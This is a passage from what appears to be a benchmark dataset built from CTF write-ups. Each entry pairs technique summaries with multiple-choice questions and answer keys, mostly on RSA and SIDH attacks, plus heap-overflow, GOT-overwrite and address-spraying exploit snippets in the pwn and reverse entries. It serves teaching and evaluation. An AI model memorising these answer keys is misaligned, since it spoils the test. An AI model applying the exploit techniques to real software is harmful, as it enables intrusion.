            "C. `a` is chosen in a way that for some `k`, `x = pow(a, k, n)` results in `x` being a non-trivial square root of 1 modulo `n`, which leads to finding `p` and `q`."
        ]
    },
    {
        "name": "RSA School 2nd Grade",
        "write_up": "dataset/raw/RSA School 2nd Grade.md",
        "type": "crypto",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When encountering RSA encryption in CTF challenges, if the modulus n is relatively small or standard, it's beneficial to use tools like http://factordb.com/ to find its prime factors (p and q). This strategy simplifies the decryption process since having prime factors allows for the calculation of the private key (d) using the totient function (phi), which is a prerequisite for decrypting the ciphertext.",
            "For decryption in RSA challenges, once the prime factors of n (p and q) are identified, calculate phi as (p - 1) * (q - 1), and then compute the private key d by finding the modular inverse of e mod phi. The plaintext message can then be decrypted from the ciphertext using d. This process utilizes the RSA decryption formula: m = c^d mod n, where m is the plaintext message, c is the ciphertext, and n is the modulus. Additionally, if the decrypted plaintext is in hexadecimal format, it needs to be converted to a readable string."
        ],
        "question": [
            "In the context of RSA encryption within a CTF challenge, why might it be beneficial to check the modulus \\(n\\) on factorization databases like http://factordb.com/? - A. To increase the encryption strength by using larger primes. - B. To obtain the prime factors (p and q) when \\(n\\) is relatively small or standard, simplifying the decryption process. - C. To encrypt the plaintext more securely by verifying \\(n\\) is unique. - D. To find a more complex algorithm for decryption that doesn't rely on prime factors.",
            "When you have the prime factors of \\(n\\) in an RSA challenge (denoted as \\(p\\) and \\(q\\)), and you need to decrypt a ciphertext \\(c\\), what is the correct sequence of steps to follow? - A. Calculate \\(phi\\) as \\(p + q - 1\\), compute \\(d\\) as the modular inverse of \\(phi\\) mod \\(e\\), and use \\(d\\) to decrypt the ciphertext. - B. Directly divide \\(n\\) by \\(e\\) to get \\(d\\), then use \\(d\\) to decrypt the ciphertext without calculating \\(phi\\). - C. Calculate \\(phi\\) as \\((p - 1) \\times (q - 1)\\), compute \\(d\\) as the modular inverse of \\(e\\) mod \\(phi\\), and use \\(d\\) to decrypt the ciphertext. - D. Multiply \\(p\\) and \\(q\\) to get a new modulus and use this modulus to directly decrypt the ciphertext without computing \\(d\\)."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "RSA-GCD 50",
        "write_up": "dataset/raw/RSA-GCD 50.md",
        "type": "crypto",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In RSA-based challenges, when given equations involving manipulated forms of the secret primes `p` and `q` (such as `$(p+5q)^{power_1}\\;(mod\\;n)$` and `$(2p-3q)^{power_2}\\;(mod\\;n)$`), the equations can be raised to each others' powers and simplified using the Binomial Theorem. Since most terms will include a factor of `n`, they can be eliminated modulo `n`, thereby simplifying the problem to finding a solution that only involves `p`, `q`, or both. This method leverages the fact that certain operations, when carefully chosen, can cancel out variables or factors in a way that preserves the relationship necessary for extracting the primes or their multiple.",
            "If information is missing or obfuscated, such as being provided a value that is the smallest prime number greater than the desired output instead of the output itself (e.g., given `eq1` instead of `out1`), brute-forcing within a reasonable range can be a viable strategy. This approach exploits the relative density of prime numbers within certain numerical ranges to iteratively adjust the missing value until the correct conditions are met. In RSA challenges, once a correct adjustment is made to recover the missing information, standard RSA decryption procedures (such as computing the private key `d` from `e`, `p`, and `q`) can be applied to decrypt the ciphertext.\n\nExample adjustment (simplified for clarity):\n```py\nfor i in range(10000):  \n   diff = abs(pow(eq1, power2, n)*x1 - x2)  \n   q = gcd(diff, n)  \n   if q > 1:  # Found a potential prime factor of n\n       break  \n   eq1 -= 1  # Adjust eq1 and check again\n```\n\nThis strategy demonstrates how understanding the properties of RSA encryption and prime numbers can lead to the development of effective problem-solving techniques even when direct paths to solutions are obfuscated or seemingly incomplete."
        ],
        "question": [
            "In an RSA challenge, when trying to factor the modulus `n` from equations like \\(out_1 = (p + 5q)^{power1} \\mod n\\) and \\(out_2 = (2p - 3q)^{power2} \\mod n\\), what theorem can be used after raising each equation to the power of the other's exponent to simplify the expressions?  - A. Pythagorean Theorem - B. Theorem of Total Probability - C. Binomial Theorem - D. Fermat's Little Theorem ",
            "In the context of RSA encryption, when you are given `eq1`, which represents the smallest prime number greater than a crucial value needed for decryption, but not the value itself, what strategy can be employed to recover the necessary information for decryption?  - A. Conduct a frequency analysis on `eq1`. - B. Brute-force a range of values starting from `eq1` and decreasing, checking for conditions that satisfy the RSA decryption requirements. - C. Use deep learning models to predict the value based on `eq1`. - D. Directly apply `eq1` as the decryption exponent in RSA formula. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RSA",
        "write_up": "dataset/raw/RSA.md",
        "type": "crypto",
        "competition": [
            "0CTF/2019/Quals",
            "https://ctftime.org/event/736/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "For lattice-based attacks on RSA where multiple ciphertexts are present, if the same message is encrypted with different public keys (each having the same exponent e), one can employ the Chinese Remainder Theorem along with H\u00e5stad's broadcast attack for decryption. This method is effective when the exponent e is small and the same for all ciphertexts. The key insight is that when the same plaintext is encrypted under different moduli with the same small exponent, it is vulnerable because it does not sufficiently disguise the plaintext.",
            "When attempting to decrypt ciphertexts with known moduli and a common small exponent, using the Chinese Remainder Theorem to combine the equations and then extracting the e-th root of the result reveals the original message. This approach is based on the mathematical property that when e is small and the plaintext is the same across different ciphertexts, the e-th root of the combined solution corresponds to the plaintext. This operation implicitly relies on the fact that the plaintext raised to the power of e, modulo the combination of all moduli, will still equal the plaintext if the plaintext is much smaller than all the moduli."
        ],
        "question": [
            "In the context of exploiting RSA when the same plaintext message is encrypted across multiple public keys with identical small exponents, which attack method is recommended? - A. Frequency analysis - B. Chinese Remainder Theorem and H\u00e5stad's broadcast attack - C. Differential cryptanalysis - D. Rainbow tables",
            "For a scenario where multiple ciphertexts are encrypted with different public keys but having the same small exponent and the goal is to decrypt these ciphertexts, what mathematical approach is crucial for decrypting the original message? - A. Calculating the hash of combined ciphertexts - B. Using RSA factorization techniques on each ciphertext individually - C. Applying the Chinese Remainder Theorem to combine the equations and extracting the e-th root of the result - D. Implementing AES decryption with a universal key"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "rsaos",
        "write_up": "dataset/raw/rsaos.md",
        "type": "crypto",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 666,
        "max_score": 666,
        "difficulty": 1.0,
        "knowledge": [
            "When facing challenges involving RSA encryption and signatures, especially with custom hash functions like FoldHash, crafting legitimate signatures can be done by exploiting the multiplicative property of RSA. This approach requires factoring a known hash/foldhash of a command into smaller values that can fit into a valid CRC32 hash, crafting inputs whose CRC32 hashes are equal to these factors, obtaining their RSA signatures from the server, and multiplying these signatures modulo N to get the desired signature for the original command. This method works under the condition that the target hash (e.g., the foldhash of the command for which a signature is needed) can be factored into smaller values that are valid outputs of the CRC32 function.",
            "In scenarios where direct calculation or generation of a required hash or signature is infeasible due to restrictions (such as size limits of CRC32), utilizing external tools designed to manipulate or forcibly calculate specific hash values, such as CRC32, according to desired outputs can be instrumental. These tools can generate inputs or suffixes that adjust the original input to produce a predetermined hash value. An example is using such a tool to create messages that satisfy specific hash values, facilitating the exploitation of vulnerabilities or the bypassing of security mechanisms in cryptographic challenges. \n\nExample usage of tool to force CRC values: `https://www.nayuki.io/page/forcing-a-files-crc-to-any-value`, which helps in calculating padding or additional data that, when appended to a given input, results in a CRC32 hash of a specific value, allowing for crafted requests in cryptographic attacks."
        ],
        "question": [
            "In an RSA signature scheme where signatures for privileged commands are generated using the foldhash of the command, which property of RSA is exploited when you factor the foldhash into smaller values, craft requests with CRC32 values equal to these factors, get their signatures, and then multiply these signatures mod N to obtain the signature for the original command? - A. The additive property of RSA - B. The multiplicative property of RSA - C. The division property of RSA - D. The subtractive property of RSA",
            "When attempting to create inputs that match a specific CRC32 hash value to exploit a cryptographic challenge, which kind of tool is particularly useful for crafting messages or data that satisfy certain hash criteria? - A. A tool for brute-forcing password hash matches - B. A tool specifically designed for forcing a file's CRC to any value - C. A standard hashing tool with common algorithms like SHA-256 or MD5 - D. A public key cryptography tool for generating key pairs"
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "RSAphantine",
        "write_up": "dataset/raw/RSAphantine.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 142,
        "max_score": 477,
        "difficulty": 0.2976939203354298,
        "knowledge": [
            "When solving challenges involving Diophantine equations for RSA parameters, one can derive new equations from the given set by calculating the difference or sum of the given equations to simplify and isolate variables. This allows for easier factorization or identification of relationships between the variables, aiding in deciphering the unknowns required for decrypting the RSA message.",
            "Utilizing SMT solvers like Z3 for cryptographic challenge solutions is a practical approach when dealing with a set of complex mathematical equations. By defining variables and constraints as per the equations provided, one can automate the process of finding viable solutions for variable values. This method is particularly effective for RSA challenges where direct analytical solutions might be non-trivial or too cumbersome to calculate manually. \n   \n   Example payload for Z3 usage:\n   ```python\n   from z3 import *\n   \n   x = Int(\"x\")  \n   y = Int(\"y\")  \n   z = Int(\"z\")\n   \n   s = Solver()\n   \n   # Add constraints derived from the challenge equations\n   s.add(...)\n   \n   if s.check() == sat:\n      m = s.model()\n      x_value = m[x].as_long()\n      y_value = m[y].as_long()\n      z_value = m[z].as_long()\n      # Additional steps to calculate RSA parameters and decrypt the message\n   ```"
        ],
        "question": [
            "In a cryptographic challenge involving RSA parameter generation through Diophantine equations, after using sum or difference of equations to isolate variables, what is a common next step in solving for individual variables? - A. Directly encrypt the sum or difference to find new RSA keys. - B. Use the isolated equations to generate random guesses for variable values. - C. Factorize the result of the sum or difference of equations to find potential variable values. - D. Implement a brute-force search for all possible solutions without further simplification.",
            "When faced with a set of complex equations in an RSA cryptographic challenge, which approach is most effective for finding solutions to variables? - A. Manual calculation of each variable using basic algebraic methods. - B. Deploying a neural network model trained on similar equations to predict variable values. - C. Employing SMT solvers like Z3 to systematically search for solutions based on defined constraints. - D. Relying solely on cryptographic libraries to automatically solve all equations without defining variables or constraints."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "RSASSS",
        "write_up": "dataset/raw/RSASSS.md",
        "type": "crypto",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 493,
        "max_score": 500,
        "difficulty": 0.986,
        "knowledge": [
            "When faced with RSA encryption where the encryption exponent `e` is small and the ciphertext `ct` likely did not wrap around the modulus `N`, a direct approach to obtaining the plaintext is to compute the `e`-th root of `ct`. This method applies when `N` is sufficiently large, and `e` is known to be a small integer, commonly 3. In Python, finding the `e`-th root can be performed using appropriate libraries or by implementing a root-finding function. \n   - Example payload snippet: \n     ```python\n     pt = find_root(ct, e)  \n     decoded_pt = long_to_bytes(pt).decode()\n     ```",
            "RSA challenges where `e` and the totient `\\(\\phi\\)` are not coprime often hint at an alternative approach for decryption by finding a co-prime `lam` (\u03bb) to both, effectively using a modified RSA decryption method. One can calculate `lam` as a reduced form of `\\(\\phi\\)` (e.g., `\\(\\phi // gcd(e, \\phi)\\)` where `gcd` is the greatest common divisor) to use as the totient. After obtaining `lam`, calculate the modular inverse of `e` mod `lam` to find `d`. For RSA encryption systems where direct computation of the decryption exponent `d` is not possible due to the non-coprime nature of `e` and `\\(\\phi\\)`, this method provides a viable decryption technique.\n   - Example payload snippet: \n     ```python\n     lam = phi // gcd(e, phi)  # Assuming gcd function is defined or available\n     d = inverse(e, lam)\n     first_pt = pow(ct, d, N)\n     ```\n\nThese extractions provide generalized solutions applicable to RSA-related CTF challenges, particularly focusing on overcoming encryption with small exponents and handling scenarios where traditional decryption methods are not straightforward due to unusual relationships between `e` and `\\(\\phi\\)`."
        ],
        "question": [
            "In an RSA encryption scenario where the encryption exponent `e` is small and it is given that the ciphertext `ct` likely did not exceed the modulus `N`, what is the correct approach to retrieve the plaintext? Assume you have the ciphertext `ct`, the modulus `N`, and the encryption exponent `e` is known to you as a small integer.  - A. Encrypt the ciphertext again using the same exponent `e` and modulus `N`. - B. Compute the modular inverse of `ct` using modulus `N`. - C. Directly compute the `e`-th root of `ct` to retrieve the plaintext. - D. Divide the ciphertext `ct` by the encryption exponent `e`. ",
            "In a specific RSA challenge, the encryption exponent `e` and the totient `\\(\\phi\\)` are not coprime, making the direct calculation of the decryption exponent `d` impossible. What alternative approach should be taken to proceed with decryption?  - A. Multiply `e` by `\\(\\phi\\)` to bypass the need for `d`. - B. Calculate `lam` as a reduced form of `\\(\\phi\\)` by dividing `\\(\\phi\\)` by the greatest common divisor of `e` and `\\(\\phi\\)`, then use it to find `d`. - C. Increment `e` by 1 until it becomes coprime with `\\(\\phi\\)`. - D. Replace `\\(\\phi\\)` with its square root to calculate a makeshift `d`. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "RSAyyyy",
        "write_up": "dataset/raw/RSAyyyy.md",
        "type": "crypto",
        "competition": [
            "TU/2018",
            "https://ctftime.org/event/650/tasks/"
        ],
        "score": 358,
        "max_score": 497,
        "difficulty": 0.7203219315895373,
        "knowledge": [
            "When solving RSA challenges, converting a message to its numerical representation involves converting each character to its hexadecimal representation, then concatenating them before converting to an integer. This process is critical for encoding messages according to the RSA encryption standard.  \n**Example Payload**: Given a message \"hello\", the hexadecimal conversion would look something like this in Python:\n   ```python\n   message = \"hello\"\n   message_hex = ''.join([hex(ord(x))[2:] for x in message])\n   message_int = int(message_hex, 16)\n   ```",
            "For calculating the modular multiplicative inverse during RSA decryption or signing, the Extended Euclidean Algorithm can be utilized to find the value of \\(d\\) which satisfies the equation \\(d \\cdot e \\equiv 1 \\mod \\phi(n)\\), where \\(\\phi(n)\\) is Euler's Totient Function of \\(n\\). This process is crucial for finding the private key component in RSA cryptography.  \n**Example Code**:\n   ```python\n   def xgcd(b, a):\n       x0, x1, y0, y1 = 1, 0, 0, 1\n       while a != 0:\n           q, b, a = b // a, a, b % a\n           x0, x1 = x1, x0 - q * x1\n           y0, y1 = y1, y0 - q * y1\n       return b, x0, y0\n   \n   def mulinv(b, n):\n       g, x, _ = xgcd(b, n)\n       if g == 1:\n           return x % n\n   \n   # Example usage:\n   e = 65537\n   phi_n = 11787601483213972800\n   d = mulinv(e, phi_n)\n   print(d)\n   ```"
        ],
        "question": [
            "When implementing RSA encryption, it is necessary to convert the plaintext message into a numeric format. Given the message \"security\", which of the following Python code snippets correctly performs this conversion? - A. ```python message = \"security\" message_int = sum([ord(x) for x in message]) ``` - B. ```python message = \"security\" message_bin = ''.join(format(ord(x), 'b') for x in message) message_int = int(message_bin, 2) ``` - C. ```python message = \"security\" message_hex = ''.join([hex(ord(x))[2:] for x in message]) message_int = int(message_hex, 16) ``` - D. ```python message = \"security\" message_int = int(''.join(set([str(ord(x)) for x in message]))) ```",
            "In the RSA encryption algorithm, calculating the modular multiplicative inverse is pivotal for deriving the private key component. Given p = 101, q = 113, and e = 3533, which Python code snippet correctly calculates the value of \\(d\\), the modular multiplicative inverse, ensuring that \\(d \\cdot e \\equiv 1 \\mod \\phi(n)\\)? - A. ```python def gcd(a, b): while b: a, b = b, a % b return a  d = gcd(e, (p-1)*(q-1)) ``` - B. ```python p = 101 q = 113 e = 3533 phi_n = (p - 1) * (q - 1)  def mulinv(b, n): g, x, _ = xgcd(b, n) if g == 1: return x % n  def xgcd(b, a): x0, x1, y0, y1 = 1, 0, 0, 1 while a != 0: q, b, a = b // a, a, b % a x0, x1 = x1, x0 - q * x1 y0, y1 = y1, y0 - q * y1 return b, x0, y0  d = mulinv(e, phi_n) print(d) ``` - C. ```python p = 101 q = 113 e = 3533 phi_n = (p - 1) * (q - 1) d = pow(e, -1, phi_n) ``` - D. ```python p = 101 q = 113 e = 3533 phi_n = (p - 1) * (q - 1)  def mulinv(b, n): for x in range(1, n): if (b * x) % n == 1: return x return None  d = mulinv(e, phi_n) ```"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "rsa_padding",
        "write_up": "dataset/raw/rsa_padding.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 303,
        "max_score": 1000,
        "difficulty": 0.303,
        "knowledge": [
            "When facing a scenario with RSA encryption where the same message is encrypted multiple times with slight modifications (such as added padding), a Franklin-Reiter related message attack can be an effective strategy. This attack leverages the relation between the different encryptions of the slightly altered messages to recover the original message. The specific conditions for this method to work include having at least two ciphertexts that were encrypted under the same RSA modulus (n) and exponent (e), where one message is a known or predictable alteration of the other.",
            "In the context of attacking RSA with known or predictable relationships between messages, converting hashed values (such as SHA-256 hashes of inputs) to integers and using these as paddings for messages prepares the ground for applying the Franklin-Reiter related message attack. This requires calculating GCD (Greatest Common Divisor) on polynomials constructed from the ciphertexts and padding differences, leading to the decryption of the original message without directly attacking RSA's mathematical underpinnings. This approach demonstrates how vulnerabilities in message handling and encryption logic can be exploited without needing to factorize the RSA modulus or break RSA encryption directly.\n\nExample payload to implement a Franklin-Reiter related message attack (based on the provided write-up):\n```python\ndef franklin(n, pad1, pad2, c1, c2):  \n   R.<X> = PolynomialRing(Zmod(n))  \n   f1 = (X + pad1)**3 - c1  \n   f2 = (X + pad2)**3 - c2  \n   return -gcd(f1, f2).coefficients()[0]\n   \npad1 = int(hashlib.sha256(\"input1\").hexdigest(), 16)\npad2 = int(hashlib.sha256(\"input2\").hexdigest(), 16)\nc1 = pow(pad1, 3, n)  # Example of obtaining c1, similar approach for c2 with actual ciphertext values\nc2 = pow(pad2, 3, n)  # Actual implementation would use ciphertexts provided by the challenge\n\nresult = franklin(n, pad1, pad2, c1, c2)\nprint(long_to_bytes(result))  # Assuming long_to_bytes is defined as in the provided write-up\n```\nThis payload exemplifies the approach of using cryptographic weaknesses in handling RSA message encryption, specifically through predictable padding transformations, to recover encrypted messages."
        ],
        "question": [
            "When applying a Franklin-Reiter related message attack in the context of RSA encryption, what is a crucial requirement for the attack to succeed? - A. The RSA modulus (n) must be unknown. - B. Each message must be encrypted with a unique exponent. - C. At least two ciphertexts must be encrypted under the same RSA modulus (n) and exponent (e), with one message being a known or predictable alteration of the other. - D. The encryption must use a hash function stronger than SHA-256.",
            "In the context of preparing for a Franklin-Reiter related message attack on RSA, why is converting hashed values to integers important? - A. It simplifies the RSA encryption process, making encryption faster. - B. It allows the use of stronger hash functions to secure the RSA encryption further. - C. It is essential for creating polynomials from the ciphertexts and padding differences, which is necessary for calculating the GCD on these polynomials to decrypt the original message. - D. It facilitates the direct factorization of the RSA modulus, making the attack more effective."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "RSyay!",
        "write_up": "dataset/raw/RSyay!.md",
        "type": "crypto",
        "competition": [
            "ByteBandits/2020",
            "https://ctftime.org/event/1022/tasks/"
        ],
        "score": 396,
        "max_score": 500,
        "difficulty": 0.792,
        "knowledge": [
            "When dealing with RSA encryption challenges where the modulus \\(n\\) is not directly given, but an operation involving the prime factors \\(p\\) and \\(q\\) is provided, Euler's Totient Theorem can be essential for deducing \\(n\\). Specifically, in scenarios where operations are performed modulo a prime \\(m\\) larger than \\(n\\), and \\(m\\) is known, applying the theorem helps in simplifying the equation to isolate \\(n\\). An instrumental part of the simplification process is recognizing that for any number \\(a\\) coprime with \\(m\\), \\(a^{m-1} \\mod m = 1\\), and using this to reduce the expressions provided. This approach can retrieve the modulus \\(n\\) by expressing the given operations in terms of Euler's Totient Theorem, thus facilitating the decryption or encryption of given data using the RSA algorithm.",
            "After recovering the RSA modulus \\(n\\) using mathematical manipulation as described, one can proceed to construct the RSA public key using the recovered modulus and the given public exponent \\(e\\), typically 65537 for many CTF challenges. With the public key reconstructed, data encryption or decryption can be performed according to the challenge's requirements. This method can be particularly useful when the challenge provides a unique equation involving the RSA primes and modulus, and requires participants to encrypt or decrypt given data without directly providing \\(n\\). A practical implementation involves using the PyCrypto or similar library to construct the RSA key and perform the necessary cryptographic operations."
        ],
        "question": [
            "In an RSA encryption challenge, you are given a special calculation for `x` involving prime numbers `p` and `q`, and a prime `m` larger than `n = p*q` by at least one bit: ``` x = pow(p, m, m) * pow(q, m, m) + p * pow(q, m, m) + q * pow(p, m, m) + p * q + pow(p, m - 1, m) * pow(q, m - 1, m) ``` You need to recover the RSA modulus `n`. Which theorem is particularly useful for simplifying the equation to isolate and calculate `n`? - A. Fermat's Little Theorem - B. Euler's Totient Theorem - C. Chinese Remainder Theorem - D. Wilson's Theorem",
            "After deducing the modulus `n` from a complex operation involving RSA prime factors, you are to encrypt a plaintext provided by the server. Given that the public exponent `e` is known to be 65537, which of the following steps is crucial for proceeding with the encryption? - A. Generate a new pair of prime numbers `p` and `q` to construct a new modulus - B. Use the Chinese Remainder Theorem to simplify the encryption process - C. Construct the RSA public key using the recovered modulus `n` and the given public exponent `e` - D. Apply Fermat's Little Theorem to find a new exponent for encryption"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "RTOoOS",
        "write_up": "dataset/raw/RTOoOS.md",
        "type": "reverse",
        "competition": [
            "DEFCON/2019/Quals",
            "https://ctftime.org/event/762/tasks/"
        ],
        "score": 143,
        "max_score": 201,
        "difficulty": 0.7114427860696517,
        "knowledge": [
            "When exploiting a heap overflow vulnerability in a custom heap implementation, allocating memory chunks sequentially and then causing a controlled overflow can allow for the modification of adjacent memory structures, pointers, or data. This technique can enable the attacker to alter the program's behavior, such as redirecting function pointers to arbitrary code or manipulating data structures to breach security. This approach requires a deep understanding of the heap's layout and the target application's memory management behavior.\n\n   Example scenario: Allocation of several chunks of size `0x200`, followed by an overflow chunk with carefully crafted data to overwrite adjacent memory, can be used to manipulate program behavior or data. An exploit may look like:\n   \n   ```python\n   # Allocating pre-setup chunks\n   for i in xrange(6):\n       export(sh, str(i) * l, str(i))\n   \n   # Triggering overflow to modify adjacent memory or control structure\n   export(sh, 'trigger' * l, 'A' * payload_length + arbitrary_data)\n   ```",
            "In scenarios involving out-of-bounds (OOB) memory access vulnerabilities, leveraging the predictable or constant offset between controlled memory regions and critical program structures (like the Global Offset Table (GOT) or other key variables) can enable arbitrary code execution, information disclosure, or manipulation of program logic. This often involves crafting inputs that exploit the OOB read/write to leak addresses or overwrite pointers or function addresses.\n\n   Example scenario: An attacker finds that the offset between a writable buffer (`vm_mem`) and a critical program structure (`strcasestr_got`) is constant or predictable. They can leverage an OOB write to change the `strcasestr` GOT entry to point to a gadget or function (`atoi`) that behaves beneficially for attack progression.\n\n   ```assembly\n   ; Example assembly for rewriting GOT via OOB write\n   mov rdi,atoi_got       ; Load address of atoi GOT entry into RDI\n   xor rax,rax            ; Clear RAX register\n   mov al,0x76            ; Set AL with the opcode for desired syscalls or actions\n   call rax               ; Execute syscall/action modifying GOT\n   ```"
        ],
        "question": [
            "In the context of exploiting a heap-based vulnerability, what method can an attacker use to manipulate adjacent memory structures after carefully planning the allocation of memory chunks? - A. Allocate chunks of varied sizes randomly, then deallocate them in reverse order - B. Allocate several chunks of the same size in sequence and then cause a controlled overflow with an oversized chunk to overwrite adjacent memory or control structures - C. Allocate a single large chunk of memory and use it to perform multiple overflows simultaneously - D. Use a series of small allocations and deallocations to fragment the heap and target specific memory addresses with overflows",
            "When exploiting an out-of-bounds (OOB) write vulnerability, how can an attacker manipulate a program's execution flow using the predictable offset between a writable buffer and critical program structures? - A. By using the OOB write to increment function pointers directly in the stack to bypass security checks - B. By performing an OOB read to disclose the content of adjacent memory blocks, indirectly influencing the program's decision-making - C. By exploiting the constant or predictable offset to modify the Global Offset Table (GOT) or similar structures, thus redirecting execution flow to attacker-controlled code or functions beneficial for the exploit - D. By writing arbitrary values to uninitialized memory spaces hoping to hit critical program variables or structures by chance"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Run Run Run!",
        "write_up": "dataset/raw/Run Run Run!.md",
        "type": "reverse",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 315,
        "max_score": 384,
        "difficulty": 0.8203125,
        "knowledge": [
            "When working with shellcode in constrained environments where specific registers or memory spaces must be interacted with, leveraging the architectural features of the system, such as the unused upper bytes of the AVX YMM registers in x86_64, can provide a method to temporarily store and retrieve values across operations that would normally clear such data. This could be particularly useful for bypassing specific restrictions or maintaining state across restricted operations.  \nExample payload segment: `vmovups ymm0, yword [rax] ; move data into ymm0` followed later by `vmovups yword [rax], ymm0 ; restore data from ymm0`",
            "For challenges involving binary analysis or reverse engineering where the source code is not directly available, utilizing available tools like disassemblers or interpreters specific to the platform, or even developing custom scripts to parse and understand the binary's behavior, proves crucial for extracting algorithms or logic. This process can include analyzing virtual machine bytecode to understand high-level functionality without the original code.  \nExample strategy: Utilize a combination of tools like ciqdb for Garmin Connect IQ applications and custom disassembly scripts to analyze proprietary binary formats."
        ],
        "question": [
            "In a scenario where the execution environment resets register states, clearing general purpose and floating-point registers, but does not clear the AVX YMM registers' upper bytes, which instruction could be used to preserve and later restore an 8-byte value across this reset operation?  - A. `vmovdqa xmm0, xmmword [rax];` move data into xmm0 - B. `mov qword [rax], rax;` store rax into memory - C. `vmovups ymm0, yword [rax];` move data into ymm0 - D. `push rax;` push rax onto the stack ",
            "When faced with deciphering a binary's functionality without its source code, which approach is most effective for extracting algorithmic details or understanding the encoded logic?  - A. Writing a comprehensive emulator for the binary's assembly instructions - B. Immediately attempting to rewrite the binary in a higher-level language based on assumptions - C. Utilizing specialized disassembly tools and possibly developing custom scripts to analyze binary formats and extract logical structures - D. Manually converting binary into hexadecimal and analyzing the hex dump "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "rusty_shop",
        "write_up": "dataset/raw/rusty_shop.md",
        "type": "pwn",
        "competition": [
            "FacebookCTF/2019",
            "https://ctftime.org/event/781/tasks/"
        ],
        "score": 983,
        "max_score": 1000,
        "difficulty": 0.983,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities involving a numerical calculation of overflow size, precision is crucial to ensure the payload is executed as intended. In cases where the initial payload does not achieve the expected outcome, iterating through different values by incrementing the overflow size (as represented by `NUM_REPEATS` in the provided script) can lead to success. This method is particularly useful when the script's reliability is in question or when debugging information indicates that execution is near the threshold of triggering the vulnerability.",
            "In scenarios where direct memory manipulation is possible but precise control of the overwritten memory is challenging, \"spraying\" a desired address (such as a function pointer to a \"win\" function) across a wide memory range increases the likelihood that the address will be hit and executed. This technique is exemplified by sending a large number of items (`NUM_REPEATS`) containing the address (`WIN_PTR`) to overwrite. It is a practical approach to exploit vulnerabilities in environments where the memory layout is either partially controllable or predictable to some extent.\n\nExample payload snippet for address spraying:\n```python\nr.sendlineafter(\"Name: \",p64(WIN_PTR))\nr.sendlineafter(\"Count: \",str(NUM_REPEATS))\n```"
        ],
        "question": [
            "In the context of exploiting a buffer overflow vulnerability, why might an attacker increment the overflow size by adjusting a variable like `NUM_REPEATS` in their script? - A. To decrease the precision required for exploiting the vulnerability, making the script less reliable. - B. To randomly change the behavior of the program in the hope of accidentally finding the vulnerability. - C. To iterate through different overflow sizes in order to find the precise amount needed to trigger a specific payload execution, especially when near the threshold of the vulnerability. - D. To comply with programming best practices that recommend against hardcoding values.",
            "When attempting to exploit a buffer overflow by overwriting a specific memory address (e.g., a function pointer to execute arbitrary code), why is the technique of \"spraying\" a desired address across a wide memory range through sending a large number of items containing the address (`WIN_PTR`) useful? - A. It allows the attacker to execute multiple functions simultaneously, increasing the impact of the exploit. - B. It ensures that the memory is filled with junk data, making the system crash and revealing sensitive information. - C. It increases the likelihood that the desired address will be hit and executed, especially useful in scenarios where controlling the exact overwrite location is difficult. - D. It conforms to standard programming methodologies for cleaning up unused memory spaces, thus hiding the exploit."
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "S2DH",
        "write_up": "dataset/raw/S2DH.md",
        "type": "crypto",
        "competition": [
            "RCTF/2022",
            "https://ctftime.org/event/1806/tasks/"
        ],
        "score": 769,
        "max_score": 769,
        "difficulty": 1.0,
        "knowledge": [
            "When facing challenges based on the SIDH protocol, the application of the Castryck-Decru Attack can be an effective strategy, especially when recent vulnerabilities have been discovered in the protocol. This attack enables the efficient recovery of the shared secret from the intercepted public parameters. Adjustments may be required to match the specific elliptic curve used in the challenge. For instance, if the starting curve in the provided code differs from the one in the attack's implementation, it's necessary to align them by modifying the curve equation or using automorphisms to generate the needed endomorphisms.",
            "When computing isogenies in cryptographic algorithms, especially in challenges involving key exchange protocols like SIDH, performance issues can occur due to the intensive computations required. To mitigate these performance issues, specifying the `algorithm=\"factored\"` parameter can substantially speed up the process. This approach is particularly useful in CTF challenges where execution time is critical for exploiting vulnerabilities or extracting encrypted information. \n\nExample of performance optimization in sage code:\n```python\nE.isogeny(R, algorithm=\"factored\")\n```"
        ],
        "question": [
            "When implementing the Castryck-Decru Attack against SIDH protocol in a CTF challenge, which adaptation should be made if the starting elliptic curve `E: y^2 = x^3 + x` used in the challenge does not match the curve `E: y^2 = x^3 + 6 * x^2 + x` from the attack's original implementation?  - A. Update the elliptic curve in the challenge to match the Castryck-Decru Attack's implementation directly without further adjustments. - B. Apply an automorphism to generate the necessary endomorphism, adapting the attack to the challenge's curve. - C. No adaptation is necessary; the Castryck-Decru Attack automatically adjusts to any form of elliptic curve. - D. Manually compute the isogenies without using Castryck-Decru Attack to adjust for the different curves. ",
